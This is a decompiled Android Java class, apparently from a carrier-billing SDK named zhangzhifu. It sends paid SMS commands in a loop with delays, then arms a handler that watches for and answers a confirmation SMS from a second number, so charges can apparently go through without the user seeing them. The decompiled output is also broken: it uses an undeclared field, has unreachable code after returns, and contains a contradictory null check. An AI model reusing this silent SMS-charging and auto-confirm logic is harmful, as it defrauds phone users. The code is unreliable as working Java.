package com.zhangzhifu.sdk.util.sms;

import com.zhangzhifu.sdk.db.SMSDBManager;
import com.zhangzhifu.sdk.modle.SMSBean;
import com.zhangzhifu.sdk.util.JudgeTimeUtil;
import com.zhangzhifu.sdk.util.MobileNetworkManage;
import com.zhangzhifu.sdk.util.SystemInfo;
import com.zhangzhifu.sdk.util.sms.filtersms.ReceiveSMSSign;

final class a
  extends Thread
{
  private SMSBean eT;
  
  public a(SMSFee paramSMSFee, SMSBean paramSMSBean)
  {
    this.eT = paramSMSBean;
  }
  
  public final void run()
  {
    SMSBean localSMSBean;
    SendSMS localSendSMS;
    int j;
    String str;
    Object localObject2;
    Object localObject1;
    int m;
    int i;
    if (this.eT != null)
    {
      localSMSBean = this.eT;
      com.zhangzhifu.sdk.modle.ZhangPayBean.SMS_FEEING = true;
      localSendSMS = new SendSMS();
      j = this.eT.getChargeCount();
      str = this.eT.getPort();
      localObject2 = this.eT.getCmd();
      localObject1 = localObject2;
      if (localSMSBean.isIs_fuzzy() == 1) {
        localObject1 = localObject2 + "x" + SystemInfo.getCpId(SMSFee.a(this.eU)) + "x" + SystemInfo.getServiceId(SMSFee.a(this.eU));
      }
      m = this.eT.getSmsDelayTime();
      i = j;
    }
    for (;;)
    {
      if (i <= 0)
      {
        label133:
        com.zhangzhifu.sdk.modle.ZhangPayBean.SMS_FEEING = false;
        MobileNetworkManage.recoverNetWork(SMSFee.a(this.eU));
        localObject2 = this.eT;
        localObject1 = new ReceiveSMSSign();
      }
      try
      {
        Thread.sleep(45000L);
        boolean bool;
        if (((SMSBean)localObject2).getIsSecond() == 1)
        {
          ((ReceiveSMSSign)localObject1).setEndStr(((SMSBean)localObject2).getReplyEndStr());
          ((ReceiveSMSSign)localObject1).setNeedReplay(true);
          if (((SMSBean)localObject2).getSecondType() != 1) {
            break label396;
          }
          bool = false;
          ((ReceiveSMSSign)localObject1).setRandKeyword(bool);
          ((ReceiveSMSSign)localObject1).setSendFromNumber(((SMSBean)localObject2).getSecondPort());
          ((ReceiveSMSSign)localObject1).setStartStr(((SMSBean)localObject2).getReplyStartStr());
          ((ReceiveSMSSign)localObject1).setSendFromContent(((SMSBean)localObject2).getSecondInfo());
          if ((((SMSBean)localObject2).getReplyContent() == null) && (((SMSBean)localObject2).getReplyContent().equals("")))
          {
            localObject2 = this.eU;
            ((ReceiveSMSSign)localObject1).setSendFromNumber(SMSFee.G(SMSFee.a(this.eU)));
          }
        }
        return;
        if (!JudgeTimeUtil.isMax(1, SMSFee.a(this.eU))) {
          break label133;
        }
        int k = j;
        if (localSendSMS.sendSMS(SMSFee.a(this.eU), str, (String)localObject1, null))
        {
          k = j - 1;
          localSMSBean.setChargeCount(k);
        }
        i -= 1;
        long l = m * 1000;
        try
        {
          Thread.sleep(l);
          if (k == 0)
          {
            SMSDBManager.getInstance().deleteSMSById(SMSFee.a(this.eU), localSMSBean.getId());
            j = k;
            continue;
          }
          SMSDBManager.getInstance().updateSMSChargeCountById(SMSFee.a(this.eU), localSMSBean);
          j = k;
          continue;
          label396:
          bool = true;
        }
        catch (Exception localException2)
        {
          for (;;) {}
        }
        return;
      }
      catch (Exception localException1) {}
    }
  }
}
